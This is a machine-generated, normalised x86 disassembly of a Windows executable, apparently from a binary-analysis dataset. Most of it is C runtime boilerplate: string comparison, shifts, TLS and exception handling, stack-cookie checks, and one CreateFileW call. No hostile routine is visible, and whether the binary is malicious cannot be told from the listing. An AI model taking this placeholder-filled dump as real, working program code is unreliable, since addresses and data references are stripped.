add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
sub_41cdd8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ce43
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_41cf00
call sub_411550
mov [ eax ] 0x16
call sub_411714
mov eax esi
jmp r-xdata
sub_41ce43
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40f858
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
sub edi ebx
push ecx
push ebx
push edi
call sub_41cf00
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_40fa4c
mov esi eax
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_40fa4c
add esp 0x10
inc ebx
dec [ ebp + 0x10 ]
je r-xdata
sub_41cf00
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41cf70
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_41cf90
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_4010e5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_401133
mov eax r--data
retn
sub_401164
mov eax r--data
retn
sub_401199
mov eax r--data
retn
sub_4020f4
push 0x0
push 0x1
call sub_4023e7
retn
sub_4028dd
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_402b5d
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_402951
mov ecx [ ebp - 0x18 ]
push 0x0
push 0x1
call sub_4023e7
push 0x0
push 0x0
call sub_4107db
int3
sub_4034a5
push ebp
mov ebp esp
pop ebp
jmp sub_403408
sub_403f5c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ ecx + 0x8 ]
call sub_403eb1
pop ecx
pop ebp
retn
sub_4063d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
add [ ecx + 0x14 ] eax
xor eax eax
pop ebp
retn
sub_40a4db
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push [ esi ]
call [ FreeLibrary@IAT ]
and [ esi ] 0x0
sub_40a9cb
mov ecx [ ebp - 0x484 ]
call sub_40a9f9
and [ ebp - 0x484 ] 0x0
lea ecx [ ebp - 0x438 ]
call sub_40f78e
mov eax r-xdata
retn
sub_40abc4
and [ ebp - 0x818 ] 0x0
lea ecx [ ebp - 0x828 ]
call sub_40f78e
mov eax r-xdata
retn
j_sub_40ddd3
jmp sub_40ddd3
sub_40b06a
xor ebx ebx
cmp [ ebp - 0x86c ] 0x10
lea eax [ ebp - 0x880 ]
cmovae eax [ ebp - 0x880 ]
mov [ ebp - 0x870 ] ebx
mov [ eax ] bl
mov eax r-xdata
retn
sub_40df45
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40f76b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40df60
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40f76b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40df7b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40f76b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40df96
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40f76b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40dfb1
mov [ ecx ] r--data
jmp sub_40f78e
j_sub_40f78e
jmp sub_40f78e
sub_40e092
push ebp
mov ebp esp
pop ebp
jmp sub_40e73f
j_sub_40e8f2#2
jmp sub_40e8f2
sub_40e6f4
push ecx
mov [ ecx ] r--data
call sub_410eec
pop ecx
retn
sub_40e7f7
call sub_40fe0f
retn
sub_40e8b3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40e7bd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40e8c8
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_4112f2
push 0x1
push 0x0
call sub_4114ad
add esp 0xc
jmp sub_4114cc
call eax
j_sub_40e8f2
jmp j_sub_40e8f2#2
sub_40eb2a
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411995
add esp 0x14
pop ebp
retn
sub_40eb46
push ebp
mov ebp esp
pop ebp
jmp sub_40eb4f
sub_40eb4f
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_4128df
add esp 0xc
pop ebp
retn
sub_40eb63
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40eb78
add esp 0xc
pop ebp
retn
sub_40ec3a
push esi
call sub_412a06
pop ecx
retn
sub_40ed1d
push esi
call sub_412a06
pop ecx
retn
sub_40eee8
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40ef03
add esp 0x14
pop ebp
retn
sub_40ef8c
push esi
call sub_412a06
pop ecx
retn
sub_40f161
push esi
call sub_412a06
pop ecx
retn
sub_40f225
push esi
call sub_412a06
pop ecx
retn
sub_40f22d
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f169
add esp 0xc
pop ebp
retn
sub_40f39f
push esi
call sub_412a06
pop ecx
retn
sub_40f651
push ebp
mov ebp esp
push 0x8
call sub_40f65d
pop ebp
retn
sub_40f750
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0x0
mov eax ecx
pop ebp
retn 0x8
sub_40f78e
mov [ ecx ] r--data
jmp sub_40f82f
sub_40f82f
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_40e8f2
pop ecx
sub_40f84b
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40fc9b
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40fc69
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_40fccd
push 0x1
push 0x1
push 0x0
call sub_40fe18
add esp 0xc
retn
sub_40fcdc
push 0x1
push 0x0
push 0x0
call sub_40fe18
add esp 0xc
retn
sub_40fd7c
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_40fe18
add esp 0xc
pop ebp
retn
sub_40fe06
push 0x8
call sub_4162e1
pop ecx
retn
sub_40fe0f
push 0x8
call sub_416445
pop ecx
retn
sub_40ff32
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_416445
pop ecx
sub_40ff47
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40fe18
add esp 0xc
pop ebp
retn
sub_41008c
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_41694b
pop ecx
pop ecx
retn
sub_4100a0
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40fccd
push esi
call sub_40fd7c
sub_4100ba
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_4110e5
retn
sub_4100c9
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_4112f2
push 0xff
call sub_40fc9b
call sub_411295
_start
call sub_416e0e
jmp sub_40ff79
sub_410836
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_41084a
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40e09b
jmp sub_410836
sub_410859
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40e09b
jmp sub_410836
sub_410f54
push 0xe
call sub_416445
pop ecx
retn
sub_410f83
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4110e5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4114ad
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_41150f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4115a4
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_4116dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4128df
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412703
add esp 0x10
pop ebp
retn
sub_41296a
call sub_413050
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_40e8f2
and [ rw-data ] 0x0
pop ecx
retn
call sub_4193d4
sub_412b7c
push 0x1
call sub_416445
pop ecx
retn
sub_412f06
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_412e30
add esp 0xc
pop ebp
retn 0x4
sub_412f39
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_41a035
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_412f6b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_412e30
add esp 0xc
pop ebp
retn 0x8
sub_413050
push 0x1
call sub_413059
pop ecx
retn
sub_413101
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_412a40
pop ecx
pop ecx
retn
sub_413134
push 0x1
call sub_416445
pop ecx
retn
sub_41320f
push edi
call sub_41a3f7
pop ecx
retn
sub_4133ba
push esi
call sub_41a3f7
pop ecx
retn
sub_413e17
push 0xb
call sub_416445
pop ecx
retn
sub_413ec1
push esi
call sub_41a3f7
pop ecx
retn
sub_4142a9
push esi
call sub_41a3f7
pop ecx
retn
sub_414d74
and [ rw-data ] 0x0
retn
sub_414d7c
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_414d9a
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_414db9
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_415099
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_4150a7
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_4150bc
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_41541f
push 0xc
call sub_416445
pop ecx
retn
sub_415473
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_4157d3
pop ecx
mov [ rw-data ] 0x1
sub_4157ca
push 0xd
call sub_416445
pop ecx
retn
sub_41594b
push 0xd
call sub_416445
pop ecx
retn
sub_415d4a
push 0xd
call sub_416445
pop ecx
retn
sub_415d56
push 0xc
call sub_416445
pop ecx
retn
sub_415e87
push 0xd
call sub_416445
pop ecx
retn
sub_415e90
push 0xc
call sub_416445
pop ecx
retn
sub_415f0f
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_416315
push eax
call sub_414d9a
or [ rw-data ] 0xffffffff
pop ecx
sub_415f75
push 0xc
call sub_416445
pop ecx
retn
sub_416063
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41602d
pop ecx
pop ecx
pop ebp
retn
sub_416407
push 0xa
call sub_416445
pop ecx
retn
sub_416445
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_416539
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_4165a1
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_4165e4
xor eax eax
inc eax
retn
sub_4165f8
push 0x8
push r--data
call sub_4110a0
call sub_415d5f
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_4114cc
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_416618
xor eax eax
inc eax
retn
sub_41662c
call sub_415d5f
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_4165f8
call eax
sub_41663f
push sub_4165f8
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_416650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41665d
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_41666a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_416801
test ebx ebx
je r-xdata
retn
push 0x0
call sub_416445
pop ecx
sub_4168d0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4132b0
sub_4168e6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_4132b0
sub_41693d
push sub_4168fc
call sub_415099
pop ecx
xor eax eax
retn
sub_416dc1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_416ffc
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_417005
mov esp [ ebp - 0x18 ]
call sub_4165f8
sub_417027
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40f76b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_417042
mov [ ecx ] r--data
jmp sub_40f78e
sub_417107
push [ ebp - 0x14 ]
call sub_4172fb
pop ecx
retn
sub_417240
push 0x4
mov eax sub_41cfaf
call sub_4108d1
call sub_415d5f
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41662c
call sub_4165c0
sub_417929
xor eax eax
inc eax
retn
sub_41792d
mov esp [ ebp - 0x18 ]
call sub_4165f8
sub_417aa7
xor eax eax
inc eax
retn
sub_417aab
mov esp [ ebp - 0x18 ]
call sub_4165f8
sub_417b8a
push [ ebp - 0x14 ]
call sub_417abb
pop ecx
retn
sub_417bc8
call sub_415d5f
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_415d5f
dec [ eax + 0x90 ]
sub_417e43
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_418e60
mov ecx [ rw-data ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
retn
sub_4190ed
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418ffa
add esp 0x10
pop ebp
retn
sub_419468
push 0x1
call sub_416445
pop ecx
retn
sub_419d1a
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_419502
add esp 0x18
pop ebp
retn
sub_41a009
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_419f40
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_41a054
call eax
retn
sub_41a0da
push 0xa
call sub_416445
pop ecx
retn
sub_41a1b7
push 0xa
call sub_416445
pop ecx
retn
sub_41a27f
push 0xb
call sub_416445
pop ecx
retn
sub_41a4e2
push edi
call sub_41a3f7
pop ecx
retn
sub_41a71f
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41a60c
add esp 0x18
pop ebp
retn
sub_41a73d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a755
add esp 0x10
pop ebp
retn
sub_41a86a
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a882
add esp 0x10
pop ebp
retn
sub_41c7c3
push 0x2
call sub_40fcb1
sub_41c7cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_41c8fd
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c7db
add esp 0x14
pop ebp
retn
sub_41cd23
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_41cd3a
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_41cfaf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41cfca
lea ecx [ ebp - 0xe8 ]
jmp sub_40203c
sub_41cfd5
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41cfe0
lea ecx [ ebp - 0x118 ]
jmp sub_40203c
sub_41cfeb
lea ecx [ ebp - 0x178 ]
jmp sub_40203c
sub_41cff6
lea ecx [ ebp - 0x40 ]
jmp sub_40203c
sub_41cffe
lea ecx [ ebp - 0xa0 ]
jmp sub_40203c
sub_41d009
lea ecx [ ebp - 0x190 ]
jmp sub_40203c
sub_41d014
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x194 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d032
lea ecx [ ebp + 0x8 ]
jmp sub_4020f4
sub_41d03a
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x58 ]
jmp sub_4020f4
sub_41d053
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d05b
mov eax [ ebp - 0x30 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x54 ]
jmp sub_4020f4
sub_41d074
lea ecx [ ebp - 0x54 ]
jmp sub_4020f4
sub_41d07c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d0a1
lea ecx [ ebp + 0x8 ]
jmp sub_4020f4
sub_41d0a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d0c4
lea ecx [ ebp - 0x88 ]
jmp sub_4020f4
sub_41d0cf
lea ecx [ ebp - 0x168 ]
jmp sub_4020f4
sub_41d0da
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d0e5
lea ecx [ ebp - 0x180 ]
jmp sub_40203c
sub_41d0f0
lea ecx [ ebp - 0x180 ]
jmp sub_40203c
sub_41d0fb
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d106
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d111
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d119
push [ ebp - 0x130 ]
call j_sub_40e8f2#2
pop ecx
retn
sub_41d126
mov ecx [ ebp - 0x14c ]
jmp sub_4020f4
sub_41d131
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d13c
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d147
lea ecx [ ebp - 0x128 ]
jmp sub_40b547
sub_41d152
lea ecx [ ebp - 0x70 ]
jmp sub_4020f4
sub_41d15a
lea ecx [ ebp - 0x40 ]
jmp sub_4020f4
sub_41d162
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d16d
lea ecx [ ebp - 0x58 ]
jmp sub_4020f4
sub_41d175
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d180
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d18b
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d196
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d1a1
lea ecx [ ebp - 0x148 ]
jmp sub_40203c
sub_41d1ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x184 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d1d4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d1ef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d20a
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_40203c
sub_41d223
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d23e
lea ecx [ ebp + 0x8 ]
jmp sub_4020f4
sub_41d246
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d24e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x27c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d276
lea ecx [ ebp - 0x40 ]
jmp sub_4020f4
sub_41d27e
lea ecx [ ebp - 0x28 ]
jmp sub_40203c
sub_41d286
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1b4 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d2ae
lea ecx [ ebp - 0x43c ]
jmp sub_4020f4
sub_41d2b9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x444 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d2e1
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d2e9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d304
lea ecx [ ebp + 0x8 ]
jmp sub_4020f4
sub_41d30c
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d314
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2ac ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d33c
lea ecx [ ebp - 0x230 ]
jmp sub_4020f4
sub_41d347
lea ecx [ ebp - 0x4b8 ]
jmp sub_40203c
sub_41d352
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4d4 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d37a
lea ecx [ ebp - 0x2c ]
jmp sub_4020f4
sub_41d382
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d3a7
lea ecx [ ebp - 0x2c ]
jmp sub_40203c
sub_41d3af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d3d4
lea ecx [ ebp - 0x490 ]
jmp sub_40203c
sub_41d3df
lea ecx [ ebp - 0x50 ]
jmp sub_40203c
sub_41d3e7
lea ecx [ ebp - 0x6c8 ]
jmp sub_40203c
sub_41d3f2
lea ecx [ ebp - 0x4a8 ]
jmp sub_40203c
sub_41d3fd
lea ecx [ ebp - 0x6c8 ]
jmp sub_40203c
sub_41d408
lea ecx [ ebp - 0x50 ]
jmp sub_40203c
